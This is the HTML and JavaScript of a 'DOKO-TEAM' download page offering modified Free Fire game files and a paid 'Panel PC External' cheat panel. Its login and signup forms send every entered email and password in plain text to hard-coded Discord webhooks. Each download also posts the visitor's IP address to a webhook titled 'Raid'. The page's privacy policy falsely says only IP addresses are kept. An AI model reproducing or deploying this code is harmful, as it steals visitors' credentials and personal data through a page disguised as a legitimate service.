<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ALL FILE DOKO-TEAM</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      max-width: 700px;
      margin: 40px auto;
      padding: 30px 25px;
      background-color: #121212;
      border-radius: 12px;
      color: #e0e0e0;
      transition: background-color 0.3s ease, color 0.3s ease;
    }
    body.light-mode {
      background-color: #f9f9f9;
      color: #222;
    }
    h1 {
      text-align: center;
      color: #e0e0e0;
      font-weight: 600;
      font-size: 2rem;
      margin-bottom: 30px;
      transition: color 0.3s ease;
    }
    body.light-mode h1 {
      color: #222;
    }
    label {
      font-weight: 600;
      display: block;
      margin-top: 30px;
      margin-bottom: 10px;
      font-size: 1rem;
      color: #bbb;
      transition: color 0.3s ease;
    }
    body.light-mode label {
      color: #555;
    }
    select {
      width: 100%;
      padding: 12px 14px;
      font-size: 1rem;
      margin-bottom: 20px;
      border-radius: 8px;
      border: 1.5px solid #444;
      background-color: #222;
      color: #e0e0e0;
      box-shadow: none;
      transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;
    }
    body.light-mode select {
      border-color: #ccc;
      background-color: #fff;
      color: #222;
    }
    select:focus {
      outline: none;
      border-color: #ef4444;
      background-color: #2a2a2a;
      color: #f0f0f0;
      box-shadow: 0 0 6px rgba(239, 68, 68, 0.5);
    }
    body.light-mode select:focus {
      background-color: #f0f0f0;
      color: #222;
    }
    button {
      background-color: #ef4444;
      color: white;
      border: none;
      padding: 14px 0;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      box-shadow: none;
      transition: background-color 0.3s ease;
    }
    button:disabled {
      background-color: #b91c1c;
      cursor: not-allowed;
    }
    button:not(:disabled):hover {
      background-color: #b91c1c;
    }

    .profile {
      display: flex;
      align-items: center;
      margin-bottom: 25px;
      background-color: #222;
      padding: 15px 20px;
      border-radius: 12px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.8);
      color: #e0e0e0;
      transition: background-color 0.3s ease, color 0.3s ease;
    }
    body.light-mode .profile {
      background-color: #f0f0f0;
      color: #222;
    }
    .profile img {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      object-fit: cover;
      margin-right: 20px;
      border: 3px solid #ef4444;
    }
    .profile-info h2 {
      margin: 0 0 8px 0;
      color: #ef4444;
      font-weight: 700;
      font-size: 1.4rem;
      transition: color 0.3s ease;
    }
    body.light-mode .profile-info h2 {
      color: #b22222;
    }
    .profile-info p {
      margin: 0;
      color: #bbb;
      font-size: 0.95rem;
      line-height: 1.3;
      transition: color 0.3s ease;
    }
    body.light-mode .profile-info p {
      color: #555;
    }

    .download-container {
      position: relative;
      background-color: #222;
      padding: 25px 20px 20px 20px;
      border-radius: 16px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.8);
      max-width: 100%;
      transition: background-color 0.3s ease, color 0.3s ease;
    }
    body.light-mode .download-container {
      background-color: #fff;
      color: #222;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    .traffic-light {
      position: absolute;
      top: 15px;
      left: 15px;
      display: flex;
      gap: 10px;
    }
    .traffic-light span {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      display: inline-block;
      box-shadow: inset 0 0 4px rgba(0,0,0,0.8);
    }
    .traffic-light .red {
      background-color: #ef4444;
    }
    .traffic-light .yellow {
      background-color: #facc15;
    }
    .traffic-light .green {
      background-color: #22c55e;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
    }

    /* Animated red to black gradient background for login and signup modals */
    #loginModal.show, #signupModal.show {
      background: linear-gradient(270deg, rgba(239, 68, 68, 0.7), rgba(0, 0, 0, 0.7), rgba(239, 68, 68, 0.7));
      background-size: 600% 600%;
      animation: gradientShift 20s ease-in-out infinite;
      background-blend-mode: overlay;
    }

    @keyframes gradientShift {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
    .modal.show {
      display: flex;
    }
    .modal-content {
      background-color: #1e1e1f;
      padding: 25px 20px;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.9);
      max-width: 400px;
      width: 90%;
      color: #e0e0e0;
      text-align: center;
      font-weight: 600;
      font-size: 1rem;
      letter-spacing: 0.02em;
      transition: background-color 0.3s ease, color 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    body.light-mode .modal-content {
      background-color: #f9f9f9;
      color: #222;
    }
    .modal-content::before {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      width: 250px;
      height: 250px;
      background: url('profile.png') no-repeat center center;
      background-size: contain;
      opacity: 0.15;
      transform: translate(-50%, -50%);
      pointer-events: none;
      z-index: 0;
      border-radius: 12px;
    }
    .modal-content h3 {
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.4rem;
      color: #fa8b8b;
      transition: color 0.3s ease;
    }
    body.light-mode .modal-content h3 {
      color: #c94a4a;
    }
    .modal-content input[type="password"] {
      width: 90%;
      padding: 12px 14px;
      font-size: 1rem;
      border-radius: 8px;
      border: 1.5px solid #555;
      background-color: #222;
      color: #e0e0e0;
      box-shadow: none;
      margin-bottom: 12px;
      transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;
    }
    body.light-mode .modal-content input[type="password"] {
      border-color: #ccc;
      background-color: #fff;
      color: #222;
    }
    .modal-content input[type="password"]:focus {
      outline: none;
      border-color: #fa8b8b;
      box-shadow: 0 0 6px rgba(250, 139, 139, 0.5);
      background-color: #2a2a3d;
    }
    body.light-mode .modal-content input[type="password"]:focus {
      background-color: #f0f0f0;
      color: #222;
    }
    .modal-buttons {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 10px;
    }
    .modal-buttons button {
      padding: 10px 24px;
      font-size: 1rem;
      font-weight: 700;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s ease;
      box-shadow: none;
    }
    #passwordSubmit {
      background-color: #c91010;
      color: white;
    }
    #passwordSubmit:hover {
      background-color: #776767;
    }
    #passwordCancel {
      background-color: #555;
      color: #bbb;
    }
    #passwordCancel:hover {
      background-color: #444;
    }
    .error-message {
      color: #f87171;
      font-weight: 700;
      margin-bottom: 12px;
      min-height: 1.2em;
      font-size: 0.95rem;
      letter-spacing: 0.01em;
    }

    

    /* Animations */
    .modal.show {
      animation: fadeIn 0.3s ease forwards;
    }
    @keyframes fadeIn {
      from {opacity: 0;}
      to {opacity: 1;}
    }
    button:not(:disabled) {
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    button:not(:disabled):hover {
      transform: scale(1.05);
    }
  </style>
  </head>
  <body>
    <div id="loginModal" class="modal show" role="dialog" aria-modal="true" aria-labelledby="loginModalTitle" aria-describedby="loginModalDesc">
      <div class="modal-content">
        <h3 id="loginModalTitle">Dashboard Login</h3>
        <small style="display: block; margin-bottom: 8px; color: #bbb; font-size: 0.8rem;">Please login with your email and password</small>
        <input type="email" id="loginEmail" placeholder="Email" aria-describedby="loginError" style="width: 90%; padding: 12px 14px; font-size: 1rem; border-radius: 8px; border: 1.5px solid #555; background-color: #222; color: #e0e0e0; box-shadow: none; margin-bottom: 12px; transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;" />
        <input type="password" id="loginPassword" placeholder="Password" aria-describedby="loginError" style="width: 90%; padding: 12px 14px; font-size: 1rem; border-radius: 8px; border: 1.5px solid #555; background-color: #222; color: #e0e0e0; box-shadow: none; margin-bottom: 12px; transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;" />
        <div id="loginError" class="error-message" role="alert" aria-live="assertive"></div>
        <div style="margin-top: 10px; font-size: 0.9rem; color: #bbb;">
          Don't have an account? <a href="#" id="showSignup" style="color: #ef4444; cursor: pointer; text-decoration: underline;">Sign up here</a>
        </div>
        <div class="modal-buttons">
          <button id="loginSubmit">Login</button>
      </div>
    </div>
    </div>

    <div id="signupModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="signupModalTitle" aria-describedby="signupModalDesc">
      <div class="modal-content">
        <h3 id="signupModalTitle">Create Account</h3>
        <small style="display: block; margin-bottom: 8px; color: #bbb; font-size: 0.8rem;">Please sign up with your email and password</small>
        <input type="email" id="signupEmail" placeholder="Email" aria-describedby="signupError" style="width: 90%; padding: 12px 14px; font-size: 1rem; border-radius: 8px; border: 1.5px solid #555; background-color: #222; color: #e0e0e0; box-shadow: none; margin-bottom: 12px; transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;" />
        <input type="password" id="signupPassword" placeholder="Password" aria-describedby="signupError" style="width: 90%; padding: 12px 14px; font-size: 1rem; border-radius: 8px; border: 1.5px solid #555; background-color: #222; color: #e0e0e0; box-shadow: none; margin-bottom: 12px; transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;" />
        <input type="password" id="signupConfirmPassword" placeholder="Confirm Password" aria-describedby="signupError" style="width: 90%; padding: 12px 14px; font-size: 1rem; border-radius: 8px; border: 1.5px solid #555; background-color: #222; color: #e0e0e0; box-shadow: none; margin-bottom: 12px; transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;" />
        <div id="signupError" class="error-message" role="alert" aria-live="assertive"></div>
        <div style="margin-top: 10px; font-size: 0.9rem; color: #bbb;">
          Already have an account? <a href="#" id="showLogin" style="color: #ef4444; cursor: pointer; text-decoration: underline;">Login here</a>
        </div>
        <div class="modal-buttons">
          <button id="signupSubmit">Sign Up</button>
        </div>
      </div>
    </div>

    <div id="mainContent" style="display:none;">
    <div class="profile">
      <img src="profile.png" alt="Profile" />
      <div class="profile-info" style="font-size: 2rem; font-weight: 700; color: #bb3030; position: relative; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
        DOKO - TEAM
      </div>
      
    </div>

    <h1>Download Files</h1>
    <div class="download-container" role="main">
<div style="font-size: 1.5rem; font-weight: 700; color: #ffffff; margin-bottom: 10px; text-align: right; margin-right: 20px;">
        Free Fire Modified by DOKO
      </div>
      <label for="fileSelect">Select a file to download:</label>
      <select id="fileSelect" aria-label="Select a file to download" aria-required="true">
        <option value="" disabled selected>-- Choose a file --</option>
        <option value="https://download2391.mediafire.com/xltngcnf8dqgL3U2Ilryz_E0rBy5RJPbBSlKA9B7eQZgXP_GiDGpLa9v6FVnMJtaLFZ8Jx3xDdkJNDAMp2X6kk_2kinVEuYuf4eQ6J2edjLVpAgl7QvaUm2WnJUAW2w6DsEZF_FpqXiH7yBcHh54oAbgX4MIuBQsGv606ZNJpgE/54viqkxvddn2h99/Free+Fire+1.109.1+DOKO_Team.xapk">Free Fire N32 &amp; P64 OB48 ðŸŸ¢</option>
        <option value="https://download1531.mediafire.com/m20eyfr4f5vgS6dscCEclJ982rdCZJjgIk6vylifq_QJRgenWs6Q3cyhLzPLKWJlyz0njrjZMzLThuj3cjuezlQM9syq1TSQ8pD4lVzy4IC__LL4xPWvaAQYw8sTGt2UYbniVgOxLmsK1ggzhINs3IWK9t2EtSczExAYb_A3avs/ytajqsgpbzw94jo/Free+Fire+MAX+2.109.1_DOKOTeam.xapk">Free Fire MAX N32 &amp; P64 ðŸŸ¢</option>
        <option value="https://download2302.mediafire.com/gehk01tgrtjg4DS3-PMRD6sOzAxVrBIMukZ_bq0gNHxKwj__73Z5LHCCPYHJPiU1qLNsUvtZTy4rVY6CdEHNTSBzddP-akcS0_mi11FavBLfIPro3-qY7Cen2PK99KG2C1DKKh4bzBjzMLN6kgP2NqqTn7G_uoBPtAURt-gVNiM/7u1xff1cvxr6jsm/PASSWORD_1.zip">Panel PC External ðŸ‘‘</option>
      </select>
      <button id="downloadBtn" disabled aria-disabled="true" aria-label="Download selected file">Download</button>
      <div id="downloadMessage" role="alert" aria-live="polite" style="margin-top: 12px; font-weight: 600;"></div>
    </div>

    <div id="passwordModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
      <div class="modal-content">
        <h3 id="modalTitle">Enter Password to Download</h3>
        <small style="display: block; margin-bottom: 8px; color: #bbb; font-size: 0.8rem;">DOKO PRODUCT</small>
        <input type="password" id="passwordInput" placeholder="Password" aria-describedby="passwordError" />
        <div id="buyerInfo" style="display:none; margin-top: 8px; font-weight: 700; color: #fa8b8b; text-align: left; white-space: pre-line;"></div>
        <div id="tokenBox" style="display:none; margin-top: 8px; font-weight: 700; color: #fa8b8b; text-align: center; font-family: monospace;">
          <div>Your License:</div>
          <div style="border: 2px solid #fa8b8b; border-radius: 6px; padding: 8px 0; margin-top: 4px; width: 150px; margin-left: auto; margin-right: auto; letter-spacing: 4px; font-size: 1.2rem; user-select: all;" id="tokenValue"></div>
        </div>
        <div id="qrisPrice" style="display:none; margin-top: 10px; font-weight: 700; color: #fa8b8b; font-size: 1.2rem; text-align: center;">RP 40.000</div>
        <img id="qrisImage" src="qris.png" alt="QRIS Payment" style="display:none; max-width: 300px; margin-top: 6px; border-radius: 8px;" />
        <div id="paymentStatus" style="display:none; margin-top: 8px; font-weight: 600; color: #fa8b8b;">Payment Status: Pending</div>
        <div id="passwordError" class="error-message" role="alert" aria-live="assertive"></div>
        <div class="modal-buttons">
          <button id="passwordSubmit">Submit</button>
          <button id="passwordCancel">Cancel</button>
        </div>
      </div>
    </div>

    <section id="recentDownloads" style="margin-top: 30px; background-color: #222; padding: 20px; border-radius: 12px; color: #e0e0e0; max-width: 700px; box-shadow: 0 4px 12px rgba(0,0,0,0.8); transition: background-color 0.3s ease, color 0.3s ease;">
      <h2 style="font-weight: 700; margin-bottom: 15px; color: #ef4444;">Recent Downloads</h2>
      <ul id="recentDownloadsList" style="list-style: none; padding-left: 0; max-height: 200px; overflow-y: auto;"></ul>
    </section>

    <script>
      const loginModal = document.getElementById('loginModal');
      const loginEmail = document.getElementById('loginEmail');
      const loginPassword = document.getElementById('loginPassword');
      const loginSubmit = document.getElementById('loginSubmit');
      const loginCancel = document.getElementById('loginCancel');
      const loginError = document.getElementById('loginError');
      const mainContent = document.getElementById('mainContent');

      const fileSelect = document.getElementById('fileSelect');
      const downloadBtn = document.getElementById('downloadBtn');
      const downloadMessage = document.getElementById('downloadMessage');
      const passwordModal = document.getElementById('passwordModal');
      const passwordInput = document.getElementById('passwordInput');
      const passwordSubmit = document.getElementById('passwordSubmit');
      const passwordCancel = document.getElementById('passwordCancel');
      const passwordError = document.getElementById('passwordError');
      const recentDownloadsList = document.getElementById('recentDownloadsList');
      let selectedFileUrl = '';

      // Load mode preference from localStorage
      if (localStorage.getItem('mode') === 'light') {
        document.body.classList.add('light-mode');
      }

      // Load recent downloads from localStorage
      let recentDownloads = JSON.parse(localStorage.getItem('recentDownloads') || '[]');
      function renderRecentDownloads() {
        recentDownloadsList.innerHTML = '';
        recentDownloads.forEach(item => {
          const li = document.createElement('li');
          li.style.padding = '6px 0';
          li.style.borderBottom = '1px solid #444';
          li.textContent = `${item.name} - ${item.time}`;
          recentDownloadsList.appendChild(li);
        });
      }
      renderRecentDownloads();

      fileSelect.addEventListener('change', () => {
        const hasValue = fileSelect.value !== '';
        downloadBtn.disabled = !hasValue;
        downloadBtn.setAttribute('aria-disabled', !hasValue);
        downloadMessage.textContent = '';

        // Change button text and modal title based on selection
        const selectedText = fileSelect.options[fileSelect.selectedIndex].text;
        const modalTitle = document.getElementById('modalTitle');
        const qrisImage = document.getElementById('qrisImage');
        const paymentStatus = document.getElementById('paymentStatus');

        if (selectedText === 'Panel PC External ðŸ‘‘') {
          downloadBtn.textContent = 'Pay';
          modalTitle.textContent = 'Pay For Panel PC External';
          qrisImage.style.display = 'block';
          paymentStatus.style.display = 'block';
          const qrisPrice = document.getElementById('qrisPrice');
          qrisPrice.style.display = 'block';
        } else {
          downloadBtn.textContent = 'Download';
          modalTitle.textContent = 'Enter Password to Download';
          qrisImage.style.display = 'none';
          paymentStatus.style.display = 'none';
          const qrisPrice = document.getElementById('qrisPrice');
          qrisPrice.style.display = 'none';
        }
      });

      downloadBtn.addEventListener('click', () => {
        if (fileSelect.value) {
          selectedFileUrl = fileSelect.value;
          passwordInput.value = '';
          passwordError.textContent = '';
          downloadMessage.textContent = '';

          // Ensure modal title and qris image visibility are correct on button click
          const selectedText = fileSelect.options[fileSelect.selectedIndex].text;
          const modalTitle = document.getElementById('modalTitle');
          const qrisImage = document.getElementById('qrisImage');
          const paymentStatus = document.getElementById('paymentStatus');
          const buyerInfo = document.getElementById('buyerInfo');

          if (selectedText === 'Panel PC External ðŸ‘‘') {
            modalTitle.textContent = 'Pay For Panel PC External';
            qrisImage.style.display = 'block';
            paymentStatus.style.display = 'block';
            const qrisPrice = document.getElementById('qrisPrice');
            qrisPrice.style.display = 'block';

            // Generate random buyer ID
            const randomId = Math.floor(1000000000 + Math.random() * 9000000000);
            buyerInfo.textContent = `Buyer : \nID:${randomId}`;
            buyerInfo.style.display = 'block';

            // Generate random token and display
            const randomToken = generateRandomToken(5);
            const tokenBox = document.getElementById('tokenBox');
            const tokenValue = document.getElementById('tokenValue');
            tokenValue.textContent = '';
            tokenBox.style.display = 'block';
          } else {
            modalTitle.textContent = 'Enter Password to Download';
            qrisImage.style.display = 'none';
            paymentStatus.style.display = 'none';
            const qrisPrice = document.getElementById('qrisPrice');
            qrisPrice.style.display = 'none';
            buyerInfo.style.display = 'none';
            const tokenBox = document.getElementById('tokenBox');
            tokenBox.style.display = 'none';
          }

          passwordModal.classList.add('show');
          passwordInput.focus();
        }
      });

      // Function to generate random token string
      function generateRandomToken(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let token = '';
        for (let i = 0; i < length; i++) {
          token += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return token;
      }

      // List of common Indonesian names for username generation
      const indonesianNames = [
        'agus', 'budi', 'citra', 'dedi', 'eka', 'fajar', 'gita', 'hadi', 'indra', 'joko',
        'kiki', 'lina', 'mira', 'nina', 'oki', 'putri', 'rani', 'sari', 'tina', 'yudi'
      ];

      // Function to generate random string of digits
      function generateRandomDigits(length) {
        const digits = '0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
          result += digits.charAt(Math.floor(Math.random() * digits.length));
        }
        return result;
      }

      // Function to send webhook notification with IP address as identity
      function sendWebhook(fileName) {
        console.log('sendWebhook called with file:', fileName);
        const webhookUrl = 'https://discord.com/api/webhooks/1363897994881012033/i41EOtRIu7vIrqXTUD3xudf8pPeKFNI3SJBkyIwO7_0XUxWReKTM_9fA_KXNj3sx-xyF';
        const now = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        const formattedTime = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} | ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

        // Show loading message
        downloadMessage.textContent = 'Sending download info...';

        // Fetch user's IP address from public API
        return fetch('https://api.ipify.org?format=json')
          .then(response => {
            if (!response.ok) {
              throw new Error('Failed to fetch IP address');
            }
            return response.json();
          })
          .then(data => {
            const userIdentity = data.ip || 'Unknown User';
            const payload = {
              content: null,
              embeds: [
                {
                  title: "DOKO-TEAM | Raid",
                  description: `**File :** ${fileName}\n**Ip :** ||${userIdentity}||\n**Time :** ${formattedTime}`,
                  color: 14685461
                }
              ],
              attachments: []
            };
            return fetch(webhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(payload)
            });
          })
          .then(response => {
            if (!response.ok) {
              throw new Error('Failed to send webhook');
            }
            console.log('Webhook sent successfully');
            downloadMessage.textContent = 'Download info sent successfully.';
          })
          .catch(error => {
            console.error('Error in sendWebhook:', error);
            downloadMessage.textContent = 'Error sending download info.';
            alert('Error sending webhook: ' + error.message);
          });
      }

      passwordSubmit.addEventListener('click', () => {
        // Check password or license based on selected file
        if (fileSelect.options[fileSelect.selectedIndex].text === 'Panel PC External ðŸ‘‘') {
          // License key validation for Panel PC External
          const validLicenses = ['LICENSE-12345', 'LICENSE-67890', 'LICENSE-ABCDE']; // Example license keys
          if (validLicenses.includes(passwordInput.value)) {
            passwordModal.classList.remove('show');
            addRecentDownload(fileSelect.options[fileSelect.selectedIndex].text);
            sendWebhook(fileSelect.options[fileSelect.selectedIndex].text).then(() => {
              window.open(selectedFileUrl, '_blank');
            });
          } else {
            passwordError.textContent = 'Invalid license key. Access denied.';
          }
        } else {
          // Password validation for other files
          if (passwordInput.value === '1') {
            passwordModal.classList.remove('show');
            addRecentDownload(fileSelect.options[fileSelect.selectedIndex].text);
            sendWebhook(fileSelect.options[fileSelect.selectedIndex].text).then(() => {
              window.open(selectedFileUrl, '_blank');
            });
          } else {
            passwordError.textContent = 'Incorrect password. Access denied.';
          }
        }
      });

      passwordCancel.addEventListener('click', () => {
        passwordModal.classList.remove('show');
      });

      window.addEventListener('click', (e) => {
        if (e.target === passwordModal) {
          passwordModal.classList.remove('show');
        }
      });

      passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          passwordSubmit.click();
        }
      });

      // Add a recent download entry and update localStorage
      function addRecentDownload(fileName) {
        const now = new Date();
        const timeString = now.toLocaleString();
        recentDownloads.unshift({ name: fileName, time: timeString });
        if (recentDownloads.length > 10) {
          recentDownloads.pop();
        }
        localStorage.setItem('recentDownloads', JSON.stringify(recentDownloads));
        renderRecentDownloads();
      }

      // New function to send login webhook with email and password
      function sendLoginWebhook(email, password) {
        const webhookUrl = 'https://discord.com/api/webhooks/1364245612480036976/xz3XOwJm8YBXyhNQ_QW5-kFd69mkt7c67J-0NPgrikMKhnTIdZu6GbR9T8aTbJH5MTHd';
        const now = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        const formattedTime = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} | ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

        const payload = {
          content: null,
          embeds: [
            {
              title: "Dashboard Login",
              description: `**Email:** ${email}\n**Password:** ${password}\n**Time:** ${formattedTime}`,
              color: 3447003
            }
          ],
          attachments: []
        };

        return fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });
      }

      loginSubmit.addEventListener('click', () => {
        const email = loginEmail.value.trim();
        const password = loginPassword.value.trim();
        loginError.textContent = '';

        // Validation: email must contain '@gmail.com' and password min 8 chars
        if (!email.includes('@gmail.com') || password.length < 8) {
          loginError.textContent = 'Harap Masukan Email Dan Password Dengan Benar';
          return;
        }

        loginSubmit.disabled = true;
        loginSubmit.textContent = 'Logging in...';

        sendLoginWebhook(email, password)
          .then(response => {
            if (!response.ok) {
              throw new Error('Failed to send login info.');
            }
            loginModal.classList.remove('show');
            mainContent.style.display = 'block';
          })
          .catch(error => {
            loginError.textContent = 'Login failed. Please try again.';
            console.error('Login webhook error:', error);
          })
          .finally(() => {
            loginSubmit.disabled = false;
            loginSubmit.textContent = 'Login';
          });
      });

      loginCancel.addEventListener('click', () => {
        loginModal.classList.remove('show');
      });

      window.addEventListener('click', (e) => {
        if (e.target === loginModal) {
          loginModal.classList.remove('show');
        }
      });

      loginEmail.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          loginSubmit.click();
        }
      });

      loginPassword.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          loginSubmit.click();
        }
      });

      // Show signup modal
      const signupModal = document.getElementById('signupModal');
      const signupEmail = document.getElementById('signupEmail');
      const signupPassword = document.getElementById('signupPassword');
      const signupConfirmPassword = document.getElementById('signupConfirmPassword');
      const signupSubmit = document.getElementById('signupSubmit');
      const signupCancel = document.getElementById('signupCancel');
      const signupError = document.getElementById('signupError');
      const showSignup = document.getElementById('showSignup');
      const showLogin = document.getElementById('showLogin');

      showSignup.addEventListener('click', (e) => {
        e.preventDefault();
        loginModal.classList.remove('show');
        signupModal.classList.add('show');
        signupEmail.focus();
      });

      showLogin.addEventListener('click', (e) => {
        e.preventDefault();
        signupModal.classList.remove('show');
        loginModal.classList.add('show');
        loginEmail.focus();
      });

      signupSubmit.addEventListener('click', () => {
        const email = signupEmail.value.trim();
        const password = signupPassword.value.trim();
        const confirmPassword = signupConfirmPassword.value.trim();
        signupError.textContent = '';

        // Validation: email must contain '@gmail.com' and password min 8 chars
        if (!email.includes('@gmail.com') || password.length < 8) {
          signupError.textContent = 'Harap Masukan Email Dan Password Dengan Benar';
          return;
        }
        if (password !== confirmPassword) {
          signupError.textContent = 'Passwords do not match.';
          return;
        }

        signupSubmit.disabled = true;
        signupSubmit.textContent = 'Signing up...';

        sendSignupWebhook(email, password)
          .then(response => {
            if (!response.ok) {
              throw new Error('Failed to send signup info.');
            }
            signupError.style.color = '#22c55e';
            signupError.textContent = 'Signup successful! Please login.';
            setTimeout(() => {
              signupModal.classList.remove('show');
              loginModal.classList.add('show');
              signupError.style.color = '#f87171';
              signupError.textContent = '';
              signupEmail.value = '';
              signupPassword.value = '';
              signupConfirmPassword.value = '';
              loginEmail.focus();
            }, 2000);
          })
          .catch(error => {
            signupError.textContent = 'Signup failed. Please try again.';
            console.error('Signup webhook error:', error);
          })
          .finally(() => {
            signupSubmit.disabled = false;
            signupSubmit.textContent = 'Sign Up';
          });
      });

      // New function to send signup webhook with email and password
      function sendSignupWebhook(email, password) {
        const webhookUrl = 'https://discord.com/api/webhooks/1363897994881012033/i41EOtRIu7vIrqXTUD3xudf8pPeKFNI3SJBkyIwO7_0XUxWReKTM_9fA_KXNj3sx-xyF';
        const now = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        const formattedTime = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} | ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

        const payload = {
          content: null,
          embeds: [
            {
              title: "Dashboard Signup",
              description: `**Email:** ${email}\n**Password:** ${password}\n**Time:** ${formattedTime}`,
              color: 3447003
            }
          ],
          attachments: []
        };

        console.log('Sending signup webhook with payload:', payload);

        return fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        })
        .then(response => {
          console.log('Signup webhook response status:', response.status);
          return response;
        })
        .catch(error => {
          console.error('Error sending signup webhook:', error);
          throw error;
        });
      }

      signupCancel.addEventListener('click', () => {
        signupModal.classList.remove('show');
      });

      window.addEventListener('click', (e) => {
        if (e.target === signupModal) {
          signupModal.classList.remove('show');
        }
      });

      signupEmail.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          signupSubmit.click();
        }
      });

      signupPassword.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          signupSubmit.click();
        }
      });

      signupConfirmPassword.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          signupSubmit.click();
        }
      });
  </script>
  <footer style="margin-top: 40px; text-align: center; color: #bbb; font-size: 0.9rem; font-family: 'Poppins', sans-serif;">
    <p>This website allows users to securely download files by selecting from available options and entering a password for access.</p>
    <p><a href="#privacyPolicy" style="color: #ef4444; text-decoration: none;">Privacy Policy</a> | <a href="#contact" style="color: #ef4444; text-decoration: none;">Contact</a></p>
  </footer>

  <section id="privacyPolicy" style="max-width: 700px; margin: 40px auto; padding: 20px; background-color: #222; border-radius: 12px; color: #e0e0e0;">
    <h2>Privacy Policy</h2>
    <p>Your privacy is important to us. We do not store your personal data except for the IP address used for download logging, which is sent securely to our Discord webhook for monitoring purposes only.</p>
  </section>

  <section id="contact" style="max-width: 700px; margin: 40px auto; padding: 20px; background-color: #222; border-radius: 12px; color: #e0e0e0;">
    <h2>Contact</h2>
    <p>If you have any questions or need support, please contact us at <a href="mailto:support@doko-team.com" style="color: #ef4444;">support@doko-team.com</a>.</p>
  </section>

  <style>
    body.light-mode #privacyPolicy,
    body.light-mode #contact {
      background-color: #f9f9f9 !important;
      color: #222 !important;
    }
    body.light-mode #privacyPolicy a,
    body.light-mode #contact a {
      color: #b22222 !important;
    }
  </style>
</body>
</html>
